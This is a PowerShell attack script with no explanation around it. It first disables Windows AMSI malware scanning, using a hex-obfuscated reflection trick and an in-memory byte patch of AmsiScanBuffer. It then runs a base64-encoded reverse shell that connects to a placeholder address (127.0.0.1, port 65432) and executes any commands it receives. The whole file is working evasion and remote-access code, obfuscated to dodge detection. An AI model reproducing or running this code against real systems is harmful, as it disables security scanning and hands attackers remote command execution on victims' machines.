[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

powershell -e "JExIT1NUID0gIjEyNy4wLjAuMSI7ICRMUE9SVCA9IDY1NDMyOyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp"
